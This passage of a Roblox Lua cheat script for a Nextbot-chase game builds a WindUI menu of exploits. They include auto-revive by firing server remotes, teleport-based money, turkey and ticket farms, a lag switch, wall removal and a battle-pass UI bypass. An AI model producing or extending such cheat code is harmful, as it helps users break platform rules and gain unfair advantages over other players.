                                    task.wait()
                                until newCharacter and newCharacter:FindFirstChild("HumanoidRootPart") and newCharacter ~= character
                                
                                if newCharacter then
                                    local newHRP = newCharacter:FindFirstChild("HumanoidRootPart")
                                    if lastSavedPosition and newHRP then
                                        newHRP.CFrame = CFrame.new(lastSavedPosition)
                                    end
                                end
                                
                                isReviving = false
                            end)
                        end
                    end
                end)
            end
            
            respawnConnection = player.CharacterAdded:Connect(function(newChar)
                task.wait(0.5)
                local newHumanoid = newChar:WaitForChild("Humanoid")
                local newHRP = newChar:WaitForChild("HumanoidRootPart")
                
                if featureStates.AutoSelfRevive then
                    AutoSelfReviveConnection = newChar:GetAttributeChangedSignal("Downed"):Connect(function()
                        local isDowned = newChar:GetAttribute("Downed")
                        if isDowned and not isReviving then
                            isReviving = true
                            
                            if featureStates.SelfReviveMethod == "Spawnpoint" then
                                if not hasRevived then
                                    hasRevived = true
                                    pcall(function()
                                        ReplicatedStorage.Events.Player.ChangePlayerMode:FireServer(true)
                                    end)
                                    task.delay(10, function()
                                        hasRevived = false
                                    end)
                                    task.delay(1, function()
                                        isReviving = false
                                    end)
                                else
                                    isReviving = false
                                end
                            elseif featureStates.SelfReviveMethod == "Fake Revive" then
                                if newHRP then
                                    lastSavedPosition = newHRP.Position
                                end
                                
                                task.spawn(function()
                                    pcall(function()
                                        ReplicatedStorage:WaitForChild("Events"):WaitForChild("Player"):WaitForChild("ChangePlayerMode"):FireServer(true)
                                    end)
                                    
                                    local freshCharacter
                                    repeat
                                        freshCharacter = player.Character
                                        task.wait()
                                    until freshCharacter and freshCharacter:FindFirstChild("HumanoidRootPart") and freshCharacter ~= newChar
                                    
                                    if freshCharacter then
                                        local freshHRP = freshCharacter:FindFirstChild("HumanoidRootPart")
                                        if lastSavedPosition and freshHRP then
                                            freshHRP.CFrame = CFrame.new(lastSavedPosition)
                                        end
                                    end
                                    
                                    isReviving = false
                                end)
                            end
                        end
                    end)
                end
            end)
        else
            if AutoSelfReviveConnection then
                AutoSelfReviveConnection:Disconnect()
                AutoSelfReviveConnection = nil
            end
            if respawnConnection then
                respawnConnection:Disconnect()
                respawnConnection = nil
            end
            hasRevived = false
            isReviving = false
            lastSavedPosition = nil
        end
    end
})

SelfReviveMethodDropdown = Tabs.Auto:Dropdown({
    Title = "Self Revive Method",
    Flag = "SelfReviveMethodDropdown",
    Values = {"Spawnpoint", "Fake Revive"},
    Value = "Spawnpoint",
    Callback = function(value)
        featureStates.SelfReviveMethod = value
    end
})

if player.Character and featureStates.AutoSelfRevive then
    local char = player.Character
    local humanoid = char:WaitForChild("Humanoid")
    local hrp = char:WaitForChild("HumanoidRootPart")
    AutoSelfReviveConnection = char:GetAttributeChangedSignal("Downed"):Connect(function()
    end)
end

local function manualRevive()
    local character = player.Character
    if not character then return end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    local isDowned = character:GetAttribute("Downed")
    if not isDowned then return end
    
    if featureStates.SelfReviveMethod == "Spawnpoint" then
        if not hasRevived then
            hasRevived = true
            pcall(function()
                ReplicatedStorage.Events.Player.ChangePlayerMode:FireServer(true)
            end)
            task.delay(10, function()
                hasRevived = false
            end)
        end
    elseif featureStates.SelfReviveMethod == "Fake Revive" then
        if hrp then
            lastSavedPosition = hrp.Position
        end
        task.spawn(function()
            pcall(function()
                ReplicatedStorage:WaitForChild("Events"):WaitForChild("Player"):WaitForChild("ChangePlayerMode"):FireServer(true)
            end)
            
            local newCharacter
            repeat
                newCharacter = player.Character
                task.wait()
            until newCharacter and newCharacter:FindFirstChild("HumanoidRootPart") and newCharacter ~= character
            
            if newCharacter then
                local newHRP = newCharacter:FindFirstChild("HumanoidRootPart")
                if lastSavedPosition and newHRP then
                    newHRP.CFrame = CFrame.new(lastSavedPosition)
                end
            end
        end)
    end
end
Tabs.Auto:Button({
    Title = "Manual Revive",
    Desc = "Manually revive yourself",
    Icon = "heart",
    Callback = function()
        manualRevive()
    end
})

    AutoWinToggle = Tabs.Auto:Toggle({
        Title = "Auto Win",
        Flag = "AutoWinToggle",
        Value = false,
        Callback = function(state)
            featureStates.AutoWin = state
            if state then
                startAutoWin()
                startAntiAFK()
                AntiAFKToggle:Set(true)
            else
                stopAutoWin()
            end
        end
    })
    AutoWhistleToggle = Tabs.Auto:Toggle({
    Title = "Auto Whistle",
    Flag = "AutoWhistleToggle",
    Value = false,
    Callback = function(state)
        featureStates.AutoWhistle = state
        if state then
            startAutoWhistle()
        else
            stopAutoWhistle()
        end
    end
})

    AutoMoneyFarmToggle = Tabs.Auto:Toggle({
        Title = "Auto Money Farm",
        Flag = "AutoMoneyFarmToggle",
        Value = false,
        Callback = function(state)
        if farmsSuppressedByAntiNextbot and state then
    WindUI:Notify({
        Title = "Farm Blocked",
        Content = "Cannot enable while Nextbot is too close. Wait or move away.",
        Duration = 3
    })
    AutoMoneyFarmToggle:Set(false)
    return
end
farmsSuppressedByAntiNextbot = false
            featureStates.AutoMoneyFarm = state
            getgenv().moneyfarm = state
            if state then
                startAutoMoneyFarm()
                featureStates.FastRevive = true
                featureStates.AutoSelfRevive = true
                featureStates.FastReviveMethod = "Auto"
                pcall(function()
                    if FastReviveMethodDropdown and FastReviveMethodDropdown.Select then
                        FastReviveMethodDropdown:Select("Auto")
                    elseif FastReviveMethodDropdown and FastReviveMethodDropdown.Set then
                        FastReviveMethodDropdown:Set("Value", "Auto")
                    end
                end)
                FastReviveToggle:Set(true)
                AutoSelfReviveToggle:Set(true)
                startAutoRevive()
                startAntiAFK()
                AntiAFKToggle:Set(true)
            else
                stopAutoMoneyFarm()
            end
        end
    })
    featureStates.AutoTurkeyFarm = false

local function startAutoTurkeyFarm()
    local securityPart = workspace:FindFirstChild("SecurityPart")
    if not securityPart then
        return
    end
    
    AutoTurkeyFarmConnection = RunService.Heartbeat:Connect(function()
        if character and rootPart then
            local targetFound = false
            
            local npcsFolder = workspace:FindFirstChild("NPCs")
            if npcsFolder then
                for _, npc in ipairs(npcsFolder:GetChildren()) do
                    if npc:IsA("Model") and npc.Name == "Turkey" then
                        local turkeyHrp = npc:FindFirstChild("HumanoidRootPart")
                        if turkeyHrp then
                            rootPart.CFrame = turkeyHrp.CFrame + Vector3.new(0, 3, 0)
                            targetFound = true
                            break
                        end
                    end
                end
            end
            
            local playersFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players")
            if playersFolder and not targetFound then
                for _, model in ipairs(playersFolder:GetChildren()) do
                    if model:IsA("Model") then
                        local modelHrp = model:FindFirstChild("HumanoidRootPart")
                        if modelHrp then
                            if model.Name == "Turkey" then
                                rootPart.CFrame = modelHrp.CFrame + Vector3.new(0, 3, 0)
                                targetFound = true
                                break
                            elseif featureStates.AutoCarry and model:GetAttribute("Downed") and not model:FindFirstChild("RagdollConstraints") then
                                rootPart.CFrame = modelHrp.CFrame + Vector3.new(0, 3, 0)
                                targetFound = true
                                break
                            end
                        end
                    end
                end
            end
            
            local ticketsFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Tickets")
            if ticketsFolder and not targetFound and featureStates.AutoMoneyFarm then
                for _, ticket in ipairs(ticketsFolder:GetChildren()) do
                    local ticketHrp = ticket:FindFirstChild("HumanoidRootPart")
                    if ticketHrp then
                        rootPart.CFrame = ticketHrp.CFrame + Vector3.new(0, 3, 0)
                        targetFound = true
                        break
                    end
                end
            end
            
            if not targetFound then
                rootPart.CFrame = securityPart.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end)
end

local function stopAutoTurkeyFarm()
    if AutoTurkeyFarmConnection then
        AutoTurkeyFarmConnection:Disconnect()
        AutoTurkeyFarmConnection = nil
    end
end

AutoTurkeyFarmToggle = Tabs.Auto:Toggle({
    Title = "Auto turkey farm",
    Flag = "AutoTurkeyFarmToggle",
    Value = false,
    Callback = function(state)
        featureStates.AutoTurkeyFarm = state
        if state then
            startAutoTurkeyFarm()
            startAntiAFK()
            AntiAFKToggle:Set(true)
        else
            stopAutoTurkeyFarm()
        end
    end
})
AutoTicketFarmToggle = Tabs.Auto:Toggle({
    Title = "Auto ticket farm",
    Flag = "AutoTicketFarmToggle",
    Value = false,
    Callback = function(state)
        getgenv().ticketfarm = state
        local AutoTicketFarmConnection
        local yOffset = 15
        local currentTicket = nil
        local ticketProcessedTime = 0

        if state then
        startAntiAFK()
        AntiAFKToggle:Set(true)
            local securityPart = workspace:FindFirstChild("SecurityPart")
            if not securityPart then
                print("SecurityPart not found")
                getgenv().ticketfarm = false
                return
            end

            AutoTicketFarmConnection = game:GetService("RunService").Heartbeat:Connect(function()
                if not getgenv().ticketfarm then
                    if AutoTicketFarmConnection then
                        AutoTicketFarmConnection:Disconnect()
                        AutoTicketFarmConnection = nil
                    end
                    return
                end

                local character = player.Character
                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                local tickets = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Effects") and workspace.Game.Effects:FindFirstChild("Tickets")
                local playersInGame = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players")

                if character and humanoidRootPart then
                    if character:GetAttribute("Downed") then
                        ReplicatedStorage.Events.Player.ChangePlayerMode:FireServer(true)
                        humanoidRootPart.CFrame = securityPart.CFrame + Vector3.new(0, 3, 0)
                        return
                    end

                    if getgenv().moneyfarm and playersInGame then
                        local downedPlayerFound = false
                        for _, v in pairs(playersInGame:GetChildren()) do
                            if v:IsA("Model") and v:GetAttribute("Downed") then
                                local downedRootPart = v:FindFirstChild("HumanoidRootPart")
                                if downedRootPart then
                                    humanoidRootPart.CFrame = downedRootPart.CFrame + Vector3.new(0, 3, 0)
                                    ReplicatedStorage.Events.Character.Interact:FireServer("Revive", true, v)
                                    downedPlayerFound = true
                                    currentTicket = nil 
                                    break
                                end
                            end
                        end
                        if downedPlayerFound then
                            return
                        end
                    end

                    if tickets then
                        local activeTickets = tickets:GetChildren()
                        if #activeTickets > 0 then
                            if not currentTicket or not currentTicket.Parent then
                                currentTicket = activeTickets[1]
                                ticketProcessedTime = tick()
                            end

                            if currentTicket and currentTicket.Parent then
                                local ticketPart = currentTicket:FindFirstChild("HumanoidRootPart")
                                if ticketPart then
                                    local targetPosition = ticketPart.Position + Vector3.new(0, yOffset, 0)
                                    humanoidRootPart.CFrame = CFrame.new(targetPosition)
                                    
                                    if tick() - ticketProcessedTime > 0.1 then
                                        humanoidRootPart.CFrame = ticketPart.CFrame
                                    end
                                else
                                    currentTicket = nil
                                end
                            else
                                humanoidRootPart.CFrame = securityPart.CFrame + Vector3.new(0, 3, 0)
                                currentTicket = nil
                            end
                        else
                            humanoidRootPart.CFrame = securityPart.CFrame + Vector3.new(0, 3, 0)
                            currentTicket = nil
                        end
                    else
                        humanoidRootPart.CFrame = securityPart.CFrame + Vector3.new(0, 3, 0)
                        currentTicket = nil
                    end
                end
            end)
        else
            if AutoTicketFarmConnection then
                AutoTicketFarmConnection:Disconnect()
                AutoTicketFarmConnection = nil
            end
            currentTicket = nil
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            local securityPart = workspace:FindFirstChild("SecurityPart")
            if humanoidRootPart and securityPart then
                humanoidRootPart.CFrame = securityPart.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end
})
-- Utility Tab
NextbotObjects = {}
NextbotObjectsToggle = false
NextbotHitboxSize = 6

function createNextbotObject(nextbot)
    if not nextbot or not nextbot.Parent then return nil end
    
    local hrp = nextbot:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local collisionPart = Instance.new("Part")
    collisionPart.Name = "NextbotCollision"
    collisionPart.Size = Vector3.new(NextbotHitboxSize, NextbotHitboxSize + 2, NextbotHitboxSize)
    collisionPart.CFrame = hrp.CFrame
    collisionPart.Anchored = true
    collisionPart.CanCollide = true
    collisionPart.Transparency = 1
    collisionPart.Material = Enum.Material.ForceField
    collisionPart.Parent = workspace
    
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
    bodyVelocity.P = 1250
    bodyVelocity.Parent = collisionPart
    
    return collisionPart
end

function updateNextbotObjects()
    for nextbot, collisionPart in pairs(NextbotObjects) do
        if not nextbot.Parent or not nextbot:FindFirstChild("HumanoidRootPart") then
            collisionPart:Destroy()
            NextbotObjects[nextbot] = nil
        end
    end
    
    local targets = {}
    
    local gameFolder = workspace:FindFirstChild("Game")
    if gameFolder and gameFolder:FindFirstChild("Players") then
        for _, model in pairs(gameFolder.Players:GetChildren()) do
            if model:IsA("Model") and isNextbotModel(model) then
                table.insert(targets, model)
            end
        end
    end
    
    if workspace:FindFirstChild("NPCs") then
        for _, model in pairs(workspace.NPCs:GetChildren()) do
            if model:IsA("Model") and isNextbotModel(model) then
                table.insert(targets, model)
            end
        end
    end
    
    for _, nextbot in ipairs(targets) do
        local hrp = nextbot:FindFirstChild("HumanoidRootPart")
        if hrp then
            if not NextbotObjects[nextbot] then
                local collisionPart = createNextbotObject(nextbot)
                if collisionPart then
                    NextbotObjects[nextbot] = collisionPart
                end
            else
                NextbotObjects[nextbot].CFrame = hrp.CFrame
                NextbotObjects[nextbot].Size = Vector3.new(NextbotHitboxSize, NextbotHitboxSize + 2, NextbotHitboxSize)
            end
        end
    end
end

function startNextbotObjects()
    if NextbotObjectsConnection then 
        NextbotObjectsConnection:Disconnect()
    end
    NextbotObjectsConnection = RunService.Heartbeat:Connect(function()
        updateNextbotObjects()
    end)
end

function stopNextbotObjects()
    if NextbotObjectsConnection then
        NextbotObjectsConnection:Disconnect()
        NextbotObjectsConnection = nil
    end
    for nextbot, collisionPart in pairs(NextbotObjects) do
        collisionPart:Destroy()
    end
    NextbotObjects = {}
end

NextbotObjectsToggle = Tabs.Utility:Toggle({
    Title = "Nextbot Collision Objects",
    Flag = "NextbotObjectsToggle",
    Desc = "Add invisible collision (Why do you even need this shit lol",
    Value = false,
    Callback = function(state)
        NextbotObjectsToggle = state
        if state then
            startNextbotObjects()
        else
            stopNextbotObjects()
        end
    end
})

NextbotHitboxSlider = Tabs.Utility:Slider({
    Title = "Nextbot Hitbox Size",
    Flag = "NextbotHitboxSlider",
    Desc = "Adjust the size of nextbot collision objects",
    Value = { Min = 1, Max = 200, Default = 6, Step = 1 },
    Callback = function(value)
        NextbotHitboxSize = value
        if NextbotObjectsToggle then
            for nextbot, collisionPart in pairs(NextbotObjects) do
                if collisionPart and collisionPart.Parent then
                    collisionPart.Size = Vector3.new(NextbotHitboxSize, NextbotHitboxSize + 2, NextbotHitboxSize)
                end
            end
        end
    end
})
Tabs.Utility:Toggle({
    Title = "Exchange Menu",
    Default = false,
    Callback = function(value)
        game.Players.LocalPlayer.PlayerGui.Menu.Views.Battlepass.Exchange.Visible = value
    end
})

Tabs.Utility:Toggle({
    Title = "Bypass Battle Pass Waiting",
    Desc = "Skip all battle pass requirements and unlock everything instantly",
    Callback = function(value)
        if value then
            -- Stop loop when true
            if unlockLoop then
                unlockLoop:Disconnect()
                unlockLoop = nil
            end
            game:GetService("Players").LocalPlayer.PlayerGui.Menu.Views.Battlepass.ViewPass.Center.ViewPass.Unlocked.Visible = true
        else
            -- Start loop when false
            unlockLoop = game:GetService("RunService").Heartbeat:Connect(function()
                local unlocked = game:GetService("Players").LocalPlayer.PlayerGui.Menu.Views.Battlepass.ViewPass.Center.ViewPass.Unlocked
                if unlocked and unlocked.Parent then
                    unlocked.Visible = false
                end
            end)
        end
    end
})

Tabs.Utility:Button({
    Title = "Clear Invis Walls",
    Callback = function()
        local invisPartsFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Map") and workspace.Game.Map:FindFirstChild("InvisParts")
        if invisPartsFolder then
            for _, obj in ipairs(invisPartsFolder:GetDescendants()) do
                if obj:IsA("BasePart") then
                    obj.CanCollide = false
                end
            end
        end
    end
})

FreeCamToggle = Tabs.Utility:Toggle({
    Title = "Free Cam UI",
    Flag = "FreeCamToggle",
    Desc = "Note: Sometimes it's may be glitchy so don't use it too often, I can't really fix it",
    Icon = "camera",
    Value = false,
    Callback = function(state)
        controlFrame.Visible = state and isMobile
        if state and isMobile then
         print ("")
        elseif state and not isMobile then
            WindUI:Notify({
                Title = "Free Cam",
                Content = "Use Ctrl+P to toggle Free Cam.",
                Duration = 3
            })
            if not isFreecamEnabled then
                deactivateFreecam()
            end
        else
            if isFreecamEnabled then
                deactivateFreecam()
            end
        end
    end
})
local FreeCamSpeedSlider = Tabs.Utility:Slider({
    Title = "Free Cam Speed",
    Flag = "FreeCamSpeedSlider",
    Desc = "Adjust movement speed in Free Cam",
    Value = { Min = 1, Max = 500, Default = 50, Step = 1 },
    Callback = function(value)
        FREECAM_SPEED = value
    end
})

TimeChangerInput = Tabs.Utility:Input({
    Title = "Set Time (HH:MM)",
    Flag = "TimeChangerInput",
    Placeholder = "12:00",
    Callback = function(value)
        value = value:gsub("^%s*(.-)%s*$", "%1")
        
        local h_str, m_str = value:match("(%d+):(%d+)")
        if h_str and m_str then
            local h = tonumber(h_str)
            local m = tonumber(m_str)
            
            if h and m and h >= 0 and h <= 23 and m >= 0 and m <= 59 and #h_str <= 2 and #m_str <= 2 then
                local totalHours = h + (m / 60)
                game:GetService("Lighting").ClockTime = totalHours
             end
        end
    end
})

player.CharacterAdded:Connect(function()
    hasRevived = false
 --[[ Disabled I don't like the stupid red error thing
   if featureStates.AutoSelfRevive then
        startAutoSelfRevive()
        ]]
end)
getgenv().lagSwitchEnabled = false
getgenv().lagDuration = 0.5
local lagGui = nil
local lagGuiButton = nil
local lagInputConnection = nil
local isLagActive = false
local lagSystemLoaded = false

local function makeDraggable(frame)
    frame.Active = true
    frame.Draggable = true
    
    local dragDetector = Instance.new("UIDragDetector")
    dragDetector.Parent = frame
    
    local originalBackground = frame.BackgroundColor3
    local originalTransparency = frame.BackgroundTransparency
    
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency - 0.1
        end
    end)
    
    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency
        end
    end)
end

local function loadLagSystem()
    if lagSystemLoaded then return end
    lagSystemLoaded = true
    
    if not lagInputConnection then
        lagInputConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.KeyCode == Enum.KeyCode.L and getgenv().lagSwitchEnabled and not isLagActive then
                isLagActive = true
                task.spawn(function()
                    local duration = getgenv().lagDuration or 0.5
                    local start = tick()
                    while tick() - start < duration do
                        local a = math.random(1, 1000000) * math.random(1, 1000000)
                        a = a / math.random(1, 10000)
                    end
                    isLagActive = false
                end)
            end
        end)
    end
end

local function unloadLagSystem()
    if not lagSystemLoaded then return end
    lagSystemLoaded = false
    
    if lagInputConnection then
        lagInputConnection:Disconnect()
        lagInputConnection = nil
    end
    isLagActive = false
end

local function checkLagState()
    local shouldLoad = getgenv().lagSwitchEnabled
    
    if shouldLoad and not lagSystemLoaded then
        loadLagSystem()
    elseif not shouldLoad and lagSystemLoaded then
        unloadLagSystem()
    end
end

local function createLagGui(yOffset)
    local lagGuiOld = playerGui:FindFirstChild("LagSwitchGui")
    if lagGuiOld then lagGuiOld:Destroy() end
    
    lagGui = Instance.new("ScreenGui")
    lagGui.Name = "LagSwitchGui"
    lagGui.IgnoreGuiInset = true
    lagGui.ResetOnSpawn = false
    lagGui.Enabled = getgenv().lagSwitchEnabled
    lagGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 60, 0, 60)
    frame.Position = UDim2.new(0.5, -30, 0.12 + (yOffset or 0), 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.35
    frame.BorderSizePixel = 0
    frame.Parent = lagGui
    makeDraggable(frame)

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(150, 150, 150)
    stroke.Thickness = 2
    stroke.Parent = frame

    local label = Instance.new("TextLabel")
    label.Text = "Lag"
    label.Size = UDim2.new(0.9, 0, 0.5, 0)
    label.Position = UDim2.new(0.05, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Roboto
    label.TextSize = 16
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextScaled = true
    label.Parent = frame

    lagGuiButton = Instance.new("TextButton")
    lagGuiButton.Name = "TriggerButton"
    lagGuiButton.Text = "Trigger"
    lagGuiButton.Size = UDim2.new(0.9, 0, 0.5, 0)
    lagGuiButton.Position = UDim2.new(0.05, 0, 0.5, 0)
    lagGuiButton.BackgroundColor3 = Color3.fromRGB(0, 120, 80)
    lagGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    lagGuiButton.Font = Enum.Font.Roboto
    lagGuiButton.TextSize = 14
    lagGuiButton.TextXAlignment = Enum.TextXAlignment.Center
    lagGuiButton.TextYAlignment = Enum.TextYAlignment.Center
    lagGuiButton.TextScaled = true
    lagGuiButton.Parent = frame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = lagGuiButton

    lagGuiButton.MouseButton1Click:Connect(function()
        if not isLagActive then
            isLagActive = true
            task.spawn(function()
                local start = tick()
                while tick() - start < (getgenv().lagDuration or 0.5) do
                    local a = math.random(1, 1000000) * math.random(1, 1000000)
                    a = a / math.random(1, 10000)
                end
                isLagActive = false
            end)
        end
    end)
end

LagSwitchToggle = Tabs.Utility:Toggle({
    Title = "Lag Switch",
    Flag = "LagSwitchToggle",
    Icon = "zap",
    Value = false,
    Callback = function(state)
        getgenv().lagSwitchEnabled = state
        if state then
            if not lagGui then
                createLagGui(0)
            else
                lagGui.Enabled = true
            end
        else
            if lagGui then
                lagGui.Enabled = false
            end
        end
        checkLagState()
    end
})

LagDurationInput = Tabs.Utility:Input({
    Title = "Lag Duration (seconds)",
    Flag = "LagDurationInput",
    Placeholder = "0.5",
    Value = tostring(getgenv().lagDuration),
    NumbersOnly = true,
    Callback = function(text)
        local n = tonumber(text)
        if n and n > 0 then
            getgenv().lagDuration = n
        end
    end
})

Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        unloadLagSystem()
        if lagGui then
            lagGui:Destroy()
        end
    end
end)

checkLagState()
GravityToggle = Tabs.Utility:Toggle({
    Title = "Custom Gravity",
    Flag = "GravityToggle",
    Value = false,
    Callback = function(state)
        featureStates.CustomGravity = state
        if state then
            workspace.Gravity = featureStates.GravityValue
        else
            workspace.Gravity = originalGameGravity
        end
    end
})

GravityInput = Tabs.Utility:Input({
    Title = "Gravity Value",
    Flag = "GravityInput",
    Placeholder = tostring(originalGameGravity),
    Value = tostring(featureStates.GravityValue),
    Callback = function(text)
        local num = tonumber(text)
        if num then
            featureStates.GravityValue = num
            if featureStates.CustomGravity then
                workspace.Gravity = num
            end
        end
    end
})
getgenv().gravityGuiVisible = false

GravityGUIToggle = Tabs.Utility:Toggle({
    Title = "Gravity toggle shortcuts",
    Flag = "GravityGUIToggle",
    Desc = "Toggle gui or keybind for quick enable gravity",
    Icon = "toggle-right",
    Value = false,
    Callback = function(state)
        getgenv().gravityGuiVisible = state
        local gravityGui = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("GravityGui")
        if gravityGui then
            gravityGui.Enabled = state
        end
        if not state then
            WindUI:Notify({
                Title = "Gravity GUI",
                Content = "GUI And keybind disabled.",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "Gravity toggle shortcuts",
                Content = "GUI is enabled or Press J to toggle gravity.",
                Duration = 3
            })
        end
    end
})
featureStates.NoRender = false
featureStates.NoRenderColor = Color3.fromRGB(0, 0, 0)

NoRenderToggle = Tabs.Utility:Toggle({
    Title = "No Render",
    Flag = "NoRenderToggle",
    Desc = "Disable 3D rendering for performance",
    Value = false,
    Callback = function(state)
        featureStates.NoRender = state
        game:GetService("RunService"):Set3dRenderingEnabled(not state)
        
        if state then
            local gui = Instance.new("ScreenGui")
            gui.Name = "NoRenderBackground"
            gui.IgnoreGuiInset = true
            gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            gui.ResetOnSpawn = false
            
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundColor3 = featureStates.NoRenderColor
            frame.BorderSizePixel = 0
            frame.Parent = gui
            
            gui.Parent = player.PlayerGui
        else
            local gui = player.PlayerGui:FindFirstChild("NoRenderBackground")
            if gui then
                gui:Destroy()
            end
        end
    end
})

NoRenderColorPicker = Tabs.Utility:Colorpicker({
    Title = "No Render Color",
    Flag = "NoRenderColorPicker",
    Desc = "Choose background color when No Render is enabled",
    Default = Color3.fromRGB(0, 0, 0),
    Transparency = 0,
    Callback = function(color)
        featureStates.NoRenderColor = color
        
        if featureStates.NoRender then
            local gui = player.PlayerGui:FindFirstChild("NoRenderBackground")
            if gui then
                local frame = gui:FindFirstChildOfClass("Frame")
                if frame then
                    frame.BackgroundColor3 = color
                end
            end
        end
    end
})
featureStates.RemoveTextures = false

RemoveTexturesButton = Tabs.Utility:Button({
    Title = "Remove Textures",
    Callback = function()
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("Part") or part:IsA("MeshPart") or part:IsA("UnionOperation") or part:IsA("WedgePart") or part:IsA("CornerWedgePart") then
                if part:IsA("Part") then
                    part.Material = Enum.Material.SmoothPlastic
                end
                if part:FindFirstChildWhichIsA("Texture") then
                    local texture = part:FindFirstChildWhichIsA("Texture")
                    texture.Texture = "rbxassetid://0"
                end
                if part:FindFirstChildWhichIsA("Decal") then
                    local decal = part:FindFirstChildWhichIsA("Decal")
                    decal.Texture = "rbxassetid://0"
                end
            end
        end
    end
})
game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        game:GetService("RunService"):Set3dRenderingEnabled(true)
    end
end)
LowQualityButton = Tabs.Utility:Button({
    Title = "Low Quality",
    Desc = "Disable textures, effects, and optimize graphics",
    Callback = function()
        local ToDisable = {
            Textures = true,
            VisualEffects = true,
            Parts = true,
            Particles = true,
            Sky = true
        }

        local ToEnable = {
            FullBright = false
        }

        local Stuff = {}

        for _, v in next, game:GetDescendants() do
            if ToDisable.Parts then
                if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("BasePart") then
                    v.Material = Enum.Material.SmoothPlastic
                    table.insert(Stuff, 1, v)
                end
            end
            
            if ToDisable.Particles then
                if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
                    v.Enabled = false
                    table.insert(Stuff, 1, v)
                end
            end
            
            if ToDisable.VisualEffects then
                if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
                    v.Enabled = false
                    table.insert(Stuff, 1, v)
                end
            end
            
            if ToDisable.Textures then
                if v:IsA("Decal") or v:IsA("Texture") then
                    v.Texture = ""
                    table.insert(Stuff, 1, v)
                end
            end
            
            if ToDisable.Sky then
                if v:IsA("Sky") then
                    v.Parent = nil
                    table.insert(Stuff, 1, v)
                end
            end
        end

        if ToEnable.FullBright then
            local Lighting = game:GetService("Lighting")
            
            Lighting.FogColor = Color3.fromRGB(255, 255, 255)
            Lighting.FogEnd = math.huge
            Lighting.FogStart = math.huge
            Lighting.Ambient = Color3.fromRGB(255, 255, 255)
            Lighting.Brightness = 5
            Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)
            Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)
            Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
            Lighting.Outlines = true
        end
    end
})
Tabs.Utility:Button({
    Title = "VIP CMD Macro",
    Icon = "rbxassetid://107814281854748",
    Callback = function() 
        local coreGui = game:GetService("CoreGui")
        if coreGui:FindFirstChild("MacroManagerGUI") then
            coreGui.MacroManagerGUI.Enabled = not coreGui.MacroManagerGUI.Enabled
        end
    end
})

local invisPartsFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Map") and workspace.Game.Map:FindFirstChild("InvisParts")

local movingSecurityParts = false
local partSpeed = 10
local partRadius = 100
local storedSecurityParts = {}
local movementConnection = nil
local function disableInvisPartsCollision()
    if invisPartsFolder then
    WindUI:Notify({
                    Title = "Notification",
                    Content = "Invisible Border is removed",
                    Duration = 3
                })
        for _, obj in ipairs(invisPartsFolder:GetDescendants()) do
            if obj:IsA("BasePart") then
                obj.CanCollide = false
            end
        end
    end
end

local function restoreInvisPartsCollision()
    if invisPartsFolder then
    WindUI:Notify({
                    Title = "Notification",
                    Content = "Invisible Border is Restored",
                    Duration = 3
                })
        for _, obj in ipairs(invisPartsFolder:GetDescendants()) do
            if obj:IsA("BasePart") then
                obj.CanCollide = true
            end
        end
    end
end

local securityPartToggle = Tabs.Utility:Toggle({
    Title = "Moving Security Part",
    Flag = "securityPartToggle",
    Value = false,
    Callback = function(state)
        movingSecurityParts = state
        
        if state then
            disableInvisPartsCollision()
            
            local partNames = {"SecurityPart"}
            storedSecurityParts = {}
            
            for _, partName in ipairs(partNames) do
                local part = workspace:FindFirstChild(partName)
                if part then
                    table.insert(storedSecurityParts, part)
                end
            end
            
